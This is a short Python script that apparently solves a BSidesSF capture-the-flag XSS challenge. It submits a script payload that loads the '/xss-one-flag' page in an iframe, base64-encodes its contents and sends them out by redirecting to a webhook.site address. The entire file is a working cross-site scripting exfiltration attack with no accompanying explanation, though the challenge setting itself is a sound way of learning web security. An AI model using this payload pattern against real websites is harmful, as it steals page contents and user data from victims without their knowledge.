import requests

payload = '''
<script>
var iframe = document.createElement('iframe');
iframe.id = 'myFrame';
iframe.src = '/xss-one-flag';

document.body.appendChild(iframe);

iframe.onload = function() {
    location.href='https://webhook.site/ce31fc48-55f3-48a8-9c8e-9e849d4694d6/'+btoa(document.getElementById("myFrame").contentDocument.body.innerHTML);
};
</script>
'''
data = {'payload': payload}

response = requests.post('https://web-tutorial-1-ed930da1.challenges.bsidessf.net/xss-one-result', data=data)

print(response.text)